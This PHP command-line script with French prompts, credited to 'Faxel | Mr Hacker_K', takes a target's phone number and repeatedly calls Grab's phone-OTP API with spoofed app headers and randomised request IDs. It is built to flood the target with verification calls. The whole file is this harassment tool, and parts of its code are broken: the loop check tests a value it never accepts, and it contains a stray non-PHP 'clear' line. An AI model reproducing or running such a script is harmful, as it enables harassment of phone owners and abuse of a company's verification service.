<?php
function obtenir(){
	return trim(fgets(STDIN));
}
class farce{
	public function __construct($no){
		$this->number = $no;
	}
	private function obtenir(){
		return trim(fgets(STDIN));
	}
	private function correct($no){
		$pt = substr($no,0,2);
		if($pt=="08"){
			$no = "225".substr($no,1);
		}
		return $no;
	}
	private function faxel(){
		$no = $this->correct($this->number);
		$rand = rand(0123456,9999999);
		$rands = $this->randStr(12);
		$post = "method=CALL&countryCode=id&phoneNumber=$no&templateID=pax_android_production";
		$h[] = "x-request-id: ebf61bc3-8092-4924-bf45-$rands";
		$h[] = "Accept-Language: fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5";
		$h[] = "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)";
		$h[] = "Content-Type: application/x-www-form-urlencoded";
		$h[] = "Content-Length: ".strlen($post);
		$h[] = "Host: api.grab.com";
		$h[] = "Connection: close";
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
		curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		$x = curl_exec($ch); curl_close($ch);
		$faxel = json_decode($x,true);
		if(empty($faxel['challengeID'])){
			echo "Echouer\n";
		}else{
			echo "Reussie\n";
		}
	}
	private function loop($many,$sleep=null){
		$a=0;
		$no = $this->correct($this->number);
		while($a<$many){
			$rand = rand(0123456,9999999);
			$rands = $this->randStr(12);
			$post = "method=CALL&countryCode=id&phoneNumber=$no&templateID=pax_android_production";
			$h[] = "x-request-id: ebf61bc3-8092-4924-bf45-$rands";
			$h[] = "Accept-Language: fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5";
			$h[] = "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)";
			$h[] = "Content-Type: application/x-www-form-urlencoded";
			$h[] = "Content-Length: ".strlen($post);
			$h[] = "Host: api.grab.com";
			$h[] = "Connection: close";
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp");
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
			curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			$x = curl_exec($ch); curl_close($ch);
			$faxel = json_decode($x,true);
			if(empty($faxel['challengeID'])){
				continue;
			}else{
				$nn = $a+1;
				echo "[$nn] Reussie\r";
				$a++;
			}
			if($sleep!=null) sleep($sleep);
			if($a>=$many) echo "\n Terminer!\n";
		}
	}
	private function randStr($l){
		$data = "abcdefghijklmnopqrstuvwxyz1234567890";
		$mot = "";
		for($a=0;$a<$l;$a++){
			$mot .= $data{rand(0,strlen($data)-1)};
		}
		return $mot;
	}
	public function run(){
		while(true){
			echo "?Loop(o/n)		";
			$loop = $this->obtenir();
			if($loop=="o" OR $loop=="n"){
				break;
			}else{
				echo "Si oui, répondez o sinon répondez n \n";
				continue;
			}
		}
		if($loop=="y"){
			echo "?Plusieurs			";
			$many = $this->obtenir();
			$this->loop($many);
		}else{
			$this->faxel();
		}
	}
}
clear
echo "#################################\n# Auteur : Faxel | Mr Hacker_K #\n#################################\n"; 
echo "[++] Numéro de votre cible : ";
$no = obtenir();
$n = new farce($no);
$n->run();
